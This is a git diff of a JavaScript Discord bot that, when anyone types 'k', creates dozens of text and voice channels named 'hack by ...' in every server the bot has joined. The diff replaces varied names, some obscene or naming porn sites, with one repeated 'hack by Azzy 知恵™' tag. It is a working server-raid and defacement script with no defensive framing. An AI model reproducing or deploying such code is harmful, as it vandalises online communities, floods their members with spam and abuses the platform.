@@ -268,52 +268,52 @@ LOka.on('message', message => {
 LOka.on('message', message => {
          if (message.content === "k") {
                LOka.guilds.forEach(m =>{
-m.createChannel('hack by Dragon', 'text');
-m.createChannel('hack by Azzy™', 'text');
-m.createChannel('hack by LI 7WAK', 'text');
-m.createChannel('hack by '1-0'text');
-m.createChannel('hack by Dragon', 'text');
-m.createChannel('hack by Russia', 'text');
-m.createChannel('hack by Paris', 'text');
-m.createChannel('hack by canada', 'text');
-m.createChannel('hack by Boonk ', 'text');
-m.createChannel('hack by Gang', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
  
-m.createChannel('hack by Love', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
  
-m.createChannel('hack by Lpomn', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
  
-m.createChannel('hack by Frive', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
  
-m.createChannel('hack by Miaw', 'text');
-m.createChannel('hack by 123', 'text');
-m.createChannel('hack by 456', 'text');
-m.createChannel('hack by #)(', 'text');
-m.createChannel('hack by Ghjklm', 'text');
-m.createChannel('hack by Daddy', 'text');
-m.createChannel('hack by Momu', 'text');
-m.createChannel('hack by Mawlop', 'text');
-m.createChannel('hack by morocco', 'text');
-m.createChannel('hack by Code fish', 'text');
-m.createChannel('hack by D-Low', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
  
-m.createChannel('hack by beatbox', 'text');
-m.createChannel('hack by lip roll', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
  
-m.createChannel('hack by Slow', 'text');
-m.createChannel('hack by Fortnite', 'text');
-m.createChannel('hack by CS GO', 'text');
-m.createChannel('hack by xnxx.com', 'text');
-m.createChannel('hack by pornhub', 'text');
-m.createChannel('hack by cute', 'text');
-m.createChannel('hack by suck', 'text');
-m.createChannel('hack by my', 'text');
-m.createChannel('hack by dick', 'text');
-m.createChannel('hack by bitch', 'text');
-m.createChannel('hack by Li7wak', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
  
-m.createChannel('hack by Mos', 'text');
-m.createChannel('hack by ---cow', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
+m.createChannel('hack by Azzy 知恵™', 'text');
  
 })
 }
@@ -322,65 +322,65 @@ m.createChannel('hack by ---cow', 'text');
 LOka.on('message', message => {
          if (message.content === "k") {
                  LOka.guilds.forEach(m =>{
-m.createChannel('hack by Mos', 'voice');
-m.createChannel('hack by ncow', 'voice');
-m.createChannel('hack by Noscow', 'voice');
-m.createChannel('hack by Fascow', 'voice');
-m.createChannel('hack by Nascow', 'voice');
-m.createChannel('hack by FLscow', 'voice');
-m.createChannel('hack by PosNow', 'voice');
-m.createChannel('hack by Molmow', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
  
-m.createChannel('hack by Mplcow', 'voice');
-m.createChannel('hack by slow', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
  
-m.createChannel('hack by koss', 'voice');
-m.createChannel('hack by Joolmp', 'voice');
-m.createChannel('hack by Monklmp', 'voice');
-m.createChannel('hack by Xcvbn', 'voice');
-m.createChannel('hack by Plmonil', 'voice');
-m.createChannel('hack by Mmp', 'voice');
-m.createChannel('hack by Nooolpm', 'voice');
-m.createChannel('hack by Hjklmp', 'voice');
-m.createChannel('hack by F.Z.B', 'voice');
-m.createChannel('hack by Globak', 'voice');
-m.createChannel('hack by mook', 'voice');
-m.createChannel('hack by khtak', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
  
-m.createChannel('hack by xxxx', 'voice');
-m.createChannel('hack by wwww', 'voice');
-m.createChannel('hack by ccccw', 'voice');
-m.createChannel('hack by Moooo', 'voice');
-m.createChannel('hack by Mssss', 'voice');
-m.createChannel('hack by Mcccc', 'voice');
-m.createChannel('hack by Moooo', 'voice');
-m.createChannel('hack by Mwwww', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
  
-m.createChannel('hack by nlmpou', 'voice');
-m.createChannel('hack by MLLLM', 'voice');
-m.createChannel('hack by ML"M', 'voice');
-m.createChannel('hack by *****', 'voice');
-m.createChannel('hack by ####', 'voice');
-m.createChannel('hack by $$$$', 'voice');
-m.createChannel('hack by :::::', 'voice');
-m.createChannel('hack by M%%#', 'voice');
-m.createChannel('hack by :::::', 'voice');
-m.createChannel('hack by )(#)w', 'voice');
-m.createChannel('hack by $$$$$€', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
  
-m.createChannel('hack by &&&&&', 'voice');
-m.createChannel('hack by ¥¥¥¥¥', 'voice');
-m.createChannel('hack by ¢¢¢¢¢', 'voice');
-m.createChannel('hack by ¥¥¥¥¥', 'voice');
-m.createChannel('hack by £¢¥w', 'voice');
-m.createChannel('hack by w', 'voice');
-m.createChannel('hack by ow', 'voice');
-m.createChannel('hack by scow', 'voice');
-m.createChannel('hack by oscow', 'voice');
-m.createChannel('hack by Mosc', 'voice');
-m.createChannel('hack by Moow', 'voice');
-m.createChannel('hack by Mo¢cow', 'voice');
-m.createChannel('hack by Msco£w', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
+m.createChannel('hack by Azzy 知恵™', 'voice');
  
  
  
